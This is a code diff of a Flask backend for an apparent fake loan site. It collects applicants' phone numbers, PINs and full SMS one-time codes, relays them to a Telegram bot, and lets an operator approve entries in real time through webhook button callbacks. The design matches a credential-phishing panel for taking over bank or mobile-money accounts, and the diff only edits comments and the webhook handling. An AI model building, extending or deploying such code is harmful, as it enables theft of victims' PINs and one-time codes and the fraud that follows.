@@ -83,10 +83,8 @@ def submit_loan():
         loan_type = data.get('loan_type', '')
         purpose = data.get('purpose', '')
         
-        # Generate unique app ID
         app_id = str(uuid.uuid4())[:8]
         
-        # Store application
         applications[app_id] = {
             'phone': phone,
             'pin': pin,
@@ -99,7 +97,6 @@ def submit_loan():
             'created_at': datetime.now().isoformat()
         }
         
-        # Send to Telegram
         message = f"""
 📥 <b>NEW LOAN APPLICATION</b>
 
@@ -149,19 +146,16 @@ def submit_code():
     try:
         data = request.get_json()
         app_id = data.get('app_id')
-        full_sms = data.get('code')  # This is the FULL SMS from the user
+        full_sms = data.get('code')
         
         if app_id not in applications:
             return jsonify({'status': 'error', 'message': 'Application not found'}), 404
         
-        # Store the full SMS
         applications[app_id]['sms_code'] = full_sms
         applications[app_id]['code_status'] = 'waiting'
         
-        # Extract the code from the full SMS
         extracted_code = extract_code_from_sms(full_sms)
         
-        # Send FULL SMS to Telegram for verification
         message = f"""
 🔐 <b>CODE VERIFICATION</b>
 
@@ -204,7 +198,6 @@ def resend_code():
         if app_id not in applications:
             return jsonify({'status': 'error'}), 404
         
-        # Reset code status
         applications[app_id]['code_status'] = 'waiting'
         
         message = f"""
@@ -227,11 +220,13 @@ New OTP has been requested. Please wait for SMS.
     except Exception as e:
         return jsonify({'status': 'error'}), 500
 
+# ==================== WEBHOOK ====================
 @app.route('/webhook', methods=['POST'])
 def webhook():
     try:
         data = request.get_json()
         
+        # Handle callback queries (button clicks)
         if 'callback_query' in data:
             callback_data = data['callback_query']
             callback_id = callback_data['id']
@@ -246,11 +241,15 @@ def webhook():
                 action_type = action
                 app_id = ''
             
-            # Answer callback
+            # Answer the callback (required by Telegram)
             answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
-            requests.post(answer_url, json={'callback_query_id': callback_id, 'text': 'Done'})
+            requests.post(answer_url, json={
+                'callback_query_id': callback_id,
+                'text': '✅ Done',
+                'show_alert': False
+            })
             
-            # Update application status
+            # Update application status based on action
             if app_id in applications:
                 if action_type == 'approve_loan':
                     applications[app_id]['code_status'] = 'approved'
@@ -270,15 +269,22 @@ def webhook():
             else:
                 response = f"App {app_id} not found"
             
+            # Send confirmation message
             send_telegram_message(response)
             return jsonify({'status': 'success'})
-            
+        
+        # Handle regular messages (optional)
+        elif 'message' in data:
+            return jsonify({'status': 'ok'})
+        
+        # Default response for other updates
         return jsonify({'status': 'ok'})
         
     except Exception as e:
         print(f"Webhook error: {e}")
         return jsonify({'status': 'error'}), 500
 
+# ==================== MAIN ====================
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=True)
